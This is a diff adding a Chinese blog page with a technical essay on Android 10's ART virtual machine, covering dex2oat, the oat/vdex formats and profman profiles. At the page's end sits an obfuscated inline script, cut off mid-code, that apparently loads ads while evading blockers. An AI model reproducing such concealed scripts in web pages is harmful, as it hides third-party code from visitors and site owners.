@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>了解一下，Android 10中的ART虚拟机(2) - 编程随想</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="了解一下，Android 10中的ART虚拟机(2)" />
+<meta property="og:description" content="缘起
+接着上期”了解一下，Android 10中的ART虚拟机(I)“，今天继续介绍ART。今年春节十几天假里，我大概把profman和dex2oat整体看了一遍。出乎我意料的是，dex2oat居然再一次让我看得万念俱灰。
+在我写《深入了理解Android Java虚拟机ART》一书的时候，我最早也是先研究的dex2oat，稿子都写了100多页了，但数月过后就是无法拿下，所以只能放下它，转而去研究ART Runtime。这是我写深入理解Android 4本书来第一次碰到这种挫折。所以，书中dex2oat的字节码到机器码的编译部分在第六章，但dex2oat的源码分析却在第九章。
+我的困惑
+本来以为有了Nougat ART的基础，研究AOSP 10中的ART应该是水到渠成，但没想到依然是困难重重。虽然我很快能把AOSP 10中dex2oat的执行顺序梳理出来（这一点上和AOSP 7.0没有太大区别），但感觉这一路的风景变化很大。这其中，最让我感到恐慌的是这样一个问题：我很强烈的感觉到，dex2oat很多特性、其中的很多代码所对应的功能都和Java VM技术本身有着某种密切关系，但我却不知道这些特性、功能到底是为了解决JVM的什么问题——套用一个朋友的原话”就是每行代码都能看懂，但就是不知道为什么“——也就是知其然，却不知其所以然
+也就是说，我一直以来只是被动的去解释ART的代码，但却没有真正掌握JVM。并且，没有掌握随着Java语言本身的发展，随着整体技术的发展，JVM本身所需要做的改进。我相信代码的作者在改进ART虚拟机时脑子是有一条路线的，绝对不是一拍脑袋就想出来的。
+我之前很单纯的把上面这个问题归结于我对语言本身不了解。这才有了前面几期公众号中我试图以quickjs和javascript语言为研究课题在这方面有所突破。但这条路可能是失败了。因为js引擎（其实就是javascript虚拟机）难度并不比jvm少。而且，quickjs引擎还涉及到从js代码到quickjs字节码的编译，而这部分在jvm中是不涉及的，因为jvm处理的已经是字节码了。
+那么，问题到底在哪？同时，我对研究ART的好处也产生了巨大的怀疑，研究这玩意到底学到了什么？（这个质疑对我个人来说已经是非常严厉的了）。万般无奈之下，我转而去看一下别人关于JVM的书都讲些什么。于是，我在微信读书PC版上完整的读了周志明老师《深入理解Java虚拟机：JVM高级特性与最佳实践》，最新版，两遍。它给我带来了意想不到的感受和认识。
+我的一些认识
+先简单说下周老师这本书，我认为是名至实归的深入理解。这种”深入理解“的表现方式并不是和我的书一样，把代码给你弄出来，一行一行去给你解释。而更倾向于一种”深入浅出“：一个很复杂的东西，用最简单，最让人理解的方式表达出来，同时把它出现的背景，渊源，未来发展，甚至在实际案例中的价值都讲出来。这就非常非常难了，光涉及”渊源“的地方就需要做大量长期的跟踪工作。神农班之前安排过一个局，就是介绍Java泛型，有同学洋洋洒洒千字，但和书中对泛型在java中的介绍对比起来，这文字背后所体现的技术功底的差距就非常明显了。
+再说下我从周老师这本书里看到的一些东西。先讲讲技术之外的认识。我必须客观承认，周老师这本书我现在是能几乎无障碍读下来，而且有恍然大悟的体会。这个结果归根结底还是这几年在ART上花的功夫。这就是所谓的付出终有回报。尤其在周书中介绍编译器这一块，我没感受到太大的难度，包括Java字节码，Class的解析等。要知道在2015年前，我在Java上的经历只不过用Java开发过一些Android UI程序，对JVM毫无所知。所以，通过这一点，我觉得前几年对ART的投入，以及最终的结果——《深入理解Android Java虚拟机ART》这本书还是有效果。这个认识给了我一点信心。BTW，我感觉上述效果对其他读者也是有的。大家可以试一下——也就是拿我的书结合周老师的书一起看看。
+接下来介绍一下技术方面的认识。
+首先，JVM从一开始就不纯粹是为了Java语言而生的。我看了周老师书之后才注意到这一点。其实在Jvm规范中，人家开篇就说了”The Java Virtual Machine knows nothing of the Java programming language, only of a particular binary format, the class file format. A class file contains Java Virtual Machine instructions (or bytecodes) and a symbol table, as well as other ancillary information.“。
+上面英文的意思是JVM和Java编程语言毛关系都没有。它只认class文件。这句话完全拓展了我对JVM的认识。我一直对OS很痴迷。只不过Linux Kernel被其它人上上下下左左右右前前后后都玩透了，所以我才选择设备端的JVM为目标。但我之前并未把jvm当做一个类似kernel，类似qemu这样的虚拟机。我还计划过今年什么时候花点时间好好研究下真正的虚拟机QEMU（源码都下好了）。但这句话一出，原来踏破铁鞋无觅处，JVM就是VM（虽然实际上它还是和Java语言有各种各样的关系，但我现在看待它的角度不太一样了），不要把它和Java语言绑定死。实际上，几十年来，java语言从1发展到今天的13，但字节码却只新增了一个invoke-dynamic。从这个角度看，kotlin这个语言其实也可以当做一门独立于Java之外的语言了。甚至，只要有合适的工具，我们可以把C/C&#43;&#43;/Javascript的代码编译成class文件，转而由jvm执行了。再想多一点，某公司的某编译器，貌似其愿景和早已有几十年历史的jvm殊途同归咯？
+其次，我之前一直不明白jvm规范里为什么还要有linking（链接）的概念。我早期一直从事C&#43;&#43;的开发。在C&#43;&#43;开发中，链接往往是编译阶段的事情。而且，这个事情是通过一个比较明确的阶段来做的。即先编译，然后链接，然后生成最终的二进制。但写java程序的时候，本身是感受不到链接的。为何JVM里会有呢？其实，我们只要从一个高层次的角度来看待链接就能明白。链接，我猜测（没考证，仅仅是根据书中的内容推断的）应该在各种语言里都存在。因为它是为了解决这样的一个基本问题：即你写的代码如何调用别人写的代码？在C&#43;&#43;开发中，这个工作是由程序员来主动完成的。但对jvm来说，链接是由jvm来完成的。其目标都是一样，把你代码里调用的符号和真实的地方对应起来。
+再有，对协程的重新认识。java里的协程我最早在2010年左右就曾经接触过，但作为一个C&#43;&#43;开发者，我对线程的认识更熟悉，认为OS里的线程调度是经过千锤百炼的，而协程最终还是要转换成对线程的使用，自己搞个调度器实在是????。但最近这几年随着go语言的使用，协程又重新展示了它的巨大价值。周老师书中展示了一个测试比较，用协程后，系统的吞吐量大增。所以，协程肯定是有价值的。貌似java语言后续要原生支持协程，只不过自己搞个调度器的难度确实不小。大家拭目以待。
+最后，周老师书中对JIT和AOT优劣势有非常详细的介绍。这个让我对某司某编译器的搞法有了不同角度的评价。仁者见仁智者见智，这里就不多说了。我总体感觉是，JVM的发展和Java语言的发展关系密切，如果仅从android这个小小的领域里想引领jvm的发展，显然是有极大和致命的不足。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/99391c4a8277ede091358dee56d770b0/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-02-09T18:19:32+08:00" />
+<meta property="article:modified_time" content="2020-02-09T18:19:32+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程随想" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程随想</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">了解一下，Android 10中的ART虚拟机(2)</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <div id="js_content"> 
+ <p>缘起</p> 
+ <p>接着上期”<a href="http://mp.weixin.qq.com/s?__biz=MzU3MTkwMDU1NQ%3D%3D&amp;chksm=fcd855bbcbafdcad8b1a56f9e7239d519cc742133b5cc337e69766d7fafe0cc42ba6357b8498&amp;idx=1&amp;mid=2247483999&amp;scene=21&amp;sn=1fce8da0eb7690d2d783b0fb2700c905#wechat_redirect" rel="nofollow">了解一下，Android 10中的ART虚拟机(I)</a>“，今天继续介绍ART。今年春节十几天假里，我大概把profman和dex2oat整体看了一遍。出乎我意料的是，dex2oat居然再一次让我看得万念俱灰。</p> 
+ <p>在我写《深入了理解Android Java虚拟机ART》一书的时候，我最早也是先研究的dex2oat，稿子都写了100多页了，但数月过后就是无法拿下，所以只能放下它，转而去研究ART Runtime。这是我写深入理解Android 4本书来第一次碰到这种挫折。所以，书中dex2oat的字节码到机器码的编译部分在第六章，但dex2oat的源码分析却在第九章。</p> 
+ <p>我的困惑</p> 
+ <p>本来以为有了Nougat ART的基础，研究AOSP 10中的ART应该是水到渠成，但没想到依然是困难重重。虽然我很快能把AOSP 10中dex2oat的执行顺序梳理出来（这一点上和AOSP 7.0没有太大区别），但感觉这一路的风景变化很大。这其中，最让我感到恐慌的是这样一个问题：我很强烈的感觉到，dex2oat很多特性、其中的很多代码所对应的功能都和Java VM技术本身有着某种密切关系，但我却不知道这些特性、功能到底是为了解决JVM的什么问题——套用一个朋友的原话”就是每行代码都能看懂，但就是不知道为什么“——也就是<strong>知其然，</strong><strong>却</strong><strong>不知</strong><strong>其所以然</strong></p> 
+ <p>也就是说，我一直以来只是被动的去解释ART的代码，但却没有真正掌握JVM。并且，没有掌握随着Java语言本身的发展，随着整体技术的发展，JVM本身所需要做的改进。我相信代码的作者在改进ART虚拟机时脑子是有一条路线的，绝对不是一拍脑袋就想出来的。</p> 
+ <p>我之前很单纯的把上面这个问题归结于我对语言本身不了解。这才有了前面几期公众号中我试图以quickjs和javascript语言为研究课题在这方面有所突破。但这条路可能是失败了。因为js引擎（其实就是javascript虚拟机）难度并不比jvm少。而且，quickjs引擎还涉及到从js代码到quickjs字节码的编译，而这部分在jvm中是不涉及的，因为jvm处理的已经是字节码了。</p> 
+ <p>那么，问题到底在哪？同时，我对研究ART的好处也产生了巨大的怀疑，研究这玩意到底学到了什么？（这个质疑对我个人来说已经是非常严厉的了）。万般无奈之下，我转而去看一下别人关于JVM的书都讲些什么。于是，我在微信读书PC版上完整的读了周志明老师《深入理解Java虚拟机：JVM高级特性与最佳实践》，最新版，两遍。它给我带来了意想不到的感受和认识。<br></p> 
+ <p>我的一些认识</p> 
+ <p>先简单说下周老师这本书，我认为是名至实归的深入理解。这种”深入理解“的表现方式并不是和我的书一样，把代码给你弄出来，一行一行去给你解释。而更倾向于一种”深入浅出“：一个很复杂的东西，用最简单，最让人理解的方式表达出来，同时把它出现的背景，渊源，未来发展，甚至在实际案例中的价值都讲出来。这就非常非常难了，光涉及”渊源“的地方就需要做大量长期的跟踪工作。神农班之前安排过一个局，就是介绍Java泛型，有同学洋洋洒洒千字，但和书中对泛型在java中的介绍对比起来，这文字背后所体现的技术功底的差距就非常明显了。</p> 
+ <p>再说下我从周老师这本书里看到的一些东西。先讲讲<strong>技术之外的认识</strong>。我必须客观承认，周老师这本书我现在是能几乎无障碍读下来，而且有恍然大悟的体会。这个结果归根结底还是这几年在ART上花的功夫。这就是所谓的付出终有回报。尤其在周书中介绍编译器这一块，我没感受到太大的难度，包括Java字节码，Class的解析等。要知道在2015年前，我在Java上的经历只不过用Java开发过一些Android UI程序，对JVM毫无所知。所以，通过这一点，我觉得前几年对ART的投入，以及最终的结果——《深入理解Android Java虚拟机ART》这本书还是有效果。这个认识给了我一点信心。BTW，我感觉上述效果对其他读者也是有的。大家可以试一下——也就是拿我的书结合周老师的书一起看看。</p> 
+ <p>接下来介绍一下技术方面的认识。</p> 
+ <p>首先，JVM从一开始就不纯粹是为了Java语言而生的。我看了周老师书之后才注意到这一点。其实在Jvm规范中，人家开篇就说了”The Java Virtual Machine knows nothing of the Java programming language, only of a particular binary format, the class file format. A class file contains Java Virtual Machine instructions (or bytecodes) and a symbol table, as well as other ancillary information.“。</p> 
+ <p>上面英文的意思是JVM和Java编程语言毛关系都没有。它只认class文件。这句话完全拓展了我对JVM的认识。我一直对OS很痴迷。只不过Linux Kernel被其它人上上下下左左右右前前后后都玩透了，所以我才选择设备端的JVM为目标。但我之前并未把jvm当做一个类似kernel，类似qemu这样的虚拟机。我还计划过今年什么时候花点时间好好研究下真正的虚拟机QEMU（源码都下好了）。但这句话一出，原来踏破铁鞋无觅处，JVM就是VM（虽然实际上它还是和Java语言有各种各样的关系，但我现在看待它的角度不太一样了），不要把它和Java语言绑定死。实际上，几十年来，java语言从1发展到今天的13，但字节码却只新增了一个invoke-dynamic<img src="https://images2.imgbox.com/71/fe/Jd7xpRa1_o.png">。从这个角度看，kotlin这个语言其实也可以当做一门独立于Java之外的语言了。甚至，只要有合适的工具，我们可以把C/C++/Javascript的代码编译成class文件，转而由jvm执行了。再想多一点，某公司的某编译器，貌似其愿景和早已有几十年历史的jvm殊途同归咯？</p> 
+ <p>其次，我之前一直不明白jvm规范里为什么还要有linking（链接）的概念。我早期一直从事C++的开发。在C++开发中，链接往往是编译阶段的事情。而且，这个事情是通过一个比较明确的阶段来做的。即先编译，然后链接，然后生成最终的二进制。但写java程序的时候，本身是感受不到链接的。为何JVM里会有呢？其实，我们只要从一个高层次的角度来看待链接就能明白。链接，我猜测（没考证，仅仅是根据书中的内容推断的）应该在各种语言里都存在。因为它是为了解决这样的一个基本问题：即你写的代码如何调用别人写的代码？在C++开发中，这个工作是由程序员来主动完成的。但对jvm来说，链接是由jvm来完成的。其目标都是一样，把你代码里调用的符号和真实的地方对应起来。</p> 
+ <p>再有，对协程的重新认识。java里的协程我最早在2010年左右就曾经接触过，但作为一个C++开发者，我对线程的认识更熟悉，认为OS里的线程调度是经过千锤百炼的，而协程最终还是要转换成对线程的使用，自己搞个调度器实在是????。但最近这几年随着go语言的使用，协程又重新展示了它的巨大价值。周老师书中展示了一个测试比较，用协程后，系统的吞吐量大增。所以，协程肯定是有价值的。貌似java语言后续要原生支持协程，只不过自己搞个调度器的难度确实不小。大家拭目以待。</p> 
+ <p>最后，周老师书中对JIT和AOT优劣势有非常详细的介绍。这个让我对某司某编译器的搞法有了不同角度的评价。仁者见仁智者见智，这里就不多说了。我总体感觉是，JVM的发展和Java语言的发展关系密切，如果仅从android这个小小的领域里想引领jvm的发展，显然是有极大和致命的不足。</p> 
+ <p>以上是我基于周老师这本书的一些认识。结合我最近看《生而不凡》一书里看到的一段话。人的成长大概有两种方式，<strong>一个是来源于我们对现实认知的改变</strong>，另外一种<strong>则是来自于我们自身行为方式的升级</strong>。显然，我现在对JVM的认知有了一些新的变化，也有了更多的信心。我收集了好几本书，大概率会进一步，好好的从高层次角度把JVM摸清楚。<br></p> 
+ <p>接下来，我简单介绍下我对profman和dex2oat的一些研究成果。<br></p> 
+ <p>dex2oat</p> 
+ aosp 10中dex2oat更加清爽了，有些类的安排也更合理。 
+ <p>相比nougat，新增了compact dex、vdex等内容。oat文件格式也发生了一些变化。</p> 
+ <p>先说下如何使用dex2oat，我好不容易从编译日志文件里扒拉出主机上生成boot.oat相关的执行命令（注意，aosp 10中，如果干掉makefile里的PREOPT的话，模拟器居然不会主动生成oat文件，而是直接以解释方式执行。我之前在nougat上是没有此问题的。报错原因貌似是没有权限操作/data/dalvikvm,......）</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/46/e8/5Z6QTG5V_o.png"></p> 
+ <p>文字版的命令和输入参数如下<br></p> 
+ <p>out/soong/host/linux-x86/bin/dex2oatd</p> 
+ <p>--avoid-storing-invocation</p> 
+ <p>--write-invocation-to=out/soong/generic_x86_64/dex_apexjars/system/framework/x86_64/apex.invocation</p> 
+ <p>--runtime-arg</p> 
+ <p>-Xms64m</p> 
+ <p>--runtime-arg</p> 
+ <p>-Xmx64m</p> 
+ <p>--compiler-filter=speed-profile</p> 
+ <p>--profile-file=out/soong/generic_x86_64/dex_bootjars/boot.prof</p> 
+ <p>--dirty-image-objects=frameworks/base/config/dirty-image-objects</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/core-oj.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/core-libart.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/okhttp.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/bouncycastle.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/apache-xml.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/framework.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/ext.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/telephony-common.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/voip-common.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/ims-common.jar</p> 
+ <p>--dex-file=out/soong/generic_x86_64/dex_apexjars_input/android.test.base.jar</p> 
+ <p>--dex-location=/apex/com.android.runtime/javalib/core-oj.jar</p> 
+ <p>--dex-location=/apex/com.android.runtime/javalib/core-libart.jar</p> 
+ <p>--dex-location=/apex/com.android.runtime/javalib/okhttp.jar</p> 
+ <p>--dex-location=/apex/com.android.runtime/javalib/bouncycastle.jar</p> 
+ <p>--dex-location=/apex/com.android.runtime/javalib/apache-xml.jar</p> 
+ <p>--dex-location=/system/framework/framework.jar</p> 
+ <p>--dex-location=/system/framework/ext.jar</p> 
+ <p>--dex-location=/system/framework/telephony-common.jar</p> 
+ <p>--dex-location=/system/framework/voip-common.jar</p> 
+ <p>--dex-location=/system/framework/ims-common.jar</p> 
+ <p>--dex-location=/system/framework/android.test.base.jar</p> 
+ <p>--generate-debug-info</p> 
+ <p>--generate-build-id</p> 
+ <p>--oat-symbols=out/soong/generic_x86_64/dex_apexjars_unstripped/system/framework/x86_64/apex.oat</p> 
+ <p>--strip</p> 
+ <p>--oat-file=out/soong/generic_x86_64/dex_apexjars/system/framework/x86_64/apex.oat</p> 
+ <p>--oat-location=out/soong/generic_x86_64/dex_apexjars/system/framework/apex.oat</p> 
+ <p>--image=out/soong/generic_x86_64/dex_apexjars/system/framework/x86_64/apex.art</p> 
+ <p>--base=0x70000000</p> 
+ <p>--instruction-set=x86_64</p> 
+ <p>--instruction-set-variant=x86_64</p> 
+ <p>--instruction-set-features=default</p> 
+ <p>--android-root=out/empty</p> 
+ <p>--no-inline-from=core-oj.jar</p> 
+ <p>--abort-on-hard-verifier-error</p> 
+ <p>--generate-mini-debug-info</p> 
+ <p style="text-align: left">有了上述命令，各位可以魔改dex2oat，例如加日志，加上对其他CPU体系结构支持之类的，在host上运行就可以学习dex2oat的执行流程了，简直不能太棒....<br></p> 
+ <p style="text-align: left">dex2oat里涉及到vdex、oat的文件格式。由于时间原因，我先简单介绍下内容。以下是oat文件格式。对比nougat的oat，貌似把dex文件内容去掉了。</p> 
+ <p style="text-align: left">（以前的oat文件是完整包含dex信息的），其他的初看起来没有太大区别。</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/11/66/G1SxdZJQ_o.png"></p> 
+ <p style="text-align: left">那dex文件放哪去了？答案在vdex里。以下是vdex文件格式。这是从源码注释里抠出来的。上面说，vdex包含了从apk/jar里抽取出来的dex文件。</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/f3/55/KZEdVlZ0_o.png"></p> 
+ <p>vdex文件里有VerifierDeps，貌似和虚拟机对class文件的校验有关。属于JVM里一个比较重要的功能，我希望以后有机会单独拎出来说。这个地方也是让我之前痛苦之处。即我完全不知道Verifier到底要干啥...现在好了，我大概知道学习的方向了。</p> 
+ <p>代码中，vdex文件的生成在如下代码处</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/23/b7/raJM1969_o.png"></p> 
+ <p>另外，aosp10中，dex文件有标准dex文件和compact dex文件两种。具体我还没来得及细看。使用compact dex的话不确定能压缩多少。这一块应该属于ART本身的一种优化。</p> 
+ <p>最后，dex2oat在生成机器码时，使用的寄存器分配算法支持图着色法和线性分配。下面是对应的代码截图</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/98/05/A9esDoyQ_o.png"></p> 
+ <p>关于dex2oat，先说这么多。最关键的是最开始执行dex2oat的命令。通过这个命令，大家可以在host上跟踪dex2oat的执行流程。</p> 
+ <p>profman</p> 
+ <p>profman和生成profile文件有关，它是PGO（profile guided optimzation）的基础。简单来说，profile里统计了某个程序里的热点函数，然后机器码生成的时候可以针对这些热点函数做不同的优化。周老师一书中提到的PGO可以包含很多信息，但我从ART里看到的profile信息好像并不多。<br></p> 
+ <p>profile文件的生成有两种方式：</p> 
+ <ul><li><p>从人类可读的文本文件，通过profman转换成.profile格式的文件。这个对art boot镜像以及一些系统核心服务jar包有价值。因为这样可以在做系统的时候就提前把字节码转成机器码，所谓的Ahead of Time编译（注意，周老师书中对JIT和AOT优劣势有非常详细的介绍，建议阅读完我书第六章后再看一下，要不看不懂）。</p></li><li><p>APP运行时，由JIT模块生成.profile文件。等一定时候后，dex2oat用这个profile文件来实施PGO。</p></li></ul> 
+ <p>先看第一个例子，framework/base/services/art-profile是一个典型案例<br></p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/f4/0c/1oOCs219_o.png"></p> 
+ <p>这个案例中，显示的是人类可读的profile信息（文本文件）。其包含的核心内容是哪个类（-&gt;之前）对应的哪个方法是热点函数。注意，每一行前面还有HSP之类的字符。HSP是Hot、Start、Poststartup的意思，代表三种含义。</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/85/70/1VEHdDXM_o.png"></p> 
+ <p>Hot是热点函数，Startup和Poststartup对应虚拟机启动前/后的场景。这三个理论上可指导不同的优化方法。但我研究还不深，暂且先不对细节进行介绍。</p> 
+ <p>对了，系统类对应的profile文件位于frameworks/base/config/boot-image-profile.txt里。它最终通过build/soong/java/dexpreopt_bootjars.go来指导系统类的PGO。</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/6f/36/dcXxUcup_o.png"></p> 
+ <p>profman根据人类可读的文件后，生成.profile文件。.profile文件更方便程序读取。其文件格式如下：<br></p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/95/28/FWoFFJX0_o.png"></p> 
+ <p>此处我也不再多说。以后有机会再详细介绍。</p> 
+ <p>最后，我们介绍下程序运行时，哪里会生成profile文件。答案在ART JIT模块里。代码如下：</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/e4/d8/XkTR3Y2D_o.png"></p> 
+ <p>jit会启动一个ProfileSaver线程，具体工作方式姑且不提，最终的profile文件由这个线程去处理。</p> 
+ <p>最后，我们讲一下应用开发里经常碰到的对APP所做的性能监控。APP的性能监控和上述的Profile不是一回事。APP性能监控集中关注于某个函数调用花的时间。其采样方式如下图代码所示：</p> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/bd/ee/BwxMRu9K_o.png"></p> 
+ <p>上述代码的else分支里，APP性能监控是针对方法的,在方法Entered/Exited/Unwind之处加一些时间戳，这样就能获取每个函数调用花的时间。</p> 
+ <p>if分支里，还可能启动一个sampling_thread_函数来定期扫描各个线程的调用栈。跟踪栈顶的变化，即可知道函数调用的情况。总之，其目的是检测函数调用所花费的时间。</p> 
+ <p>后续的安排</p> 
+ <p style="text-align: left">我想重点树立起和JVM密切有关的知识体系。有了ART源码打底子，我相信这条路走得通。对JVM的掌握是非常有必要的，我感觉国家层面在底层基础核心技术上会加大投入，JVM是一个非常合适的突破口。<br></p> 
+ <p style="text-align: left">最后的最后</p> 
+ <ul><li><p>我期望的结果不是朋友们从我的书、文章、博客后学会了什么知识，干成了什么，而应该是说，神农，我可是踩在你的肩膀上的喔。</p></li><li><p>关于学习方面的问题，我已经讨论完了。后面这个公众号将对一些基础的技术，新技术做一些学习和分享。也欢迎你的投稿。不过，正如我在公众号“联系方式”里说的那样——郑渊洁在童话大王《智齿》里有一句话令我印象深刻，大意是“我有权保持沉默，但你说的每一句话都可能成为我灵感的源泉”。所以，影响不是单向的，很可能我从你那学到的东西更多。</p></li></ul> 
+ <p style="text-align: center"><img src="https://images2.imgbox.com/da/33/fjCIlEeW_o.png"></p> 
+ <p style="text-align: center">神农和朋友们的杂文集</p> 
+ <p style="text-align: center">长按识别二维码关注我们</p> 
+</div>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/b3b5a940e460be116e5bf3ea11100df4/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">let/const 的变量提升与暂时性死区</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/3905f292cc75390a3c495a513f153470/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">排队打水问题（贪心）</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程随想.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0x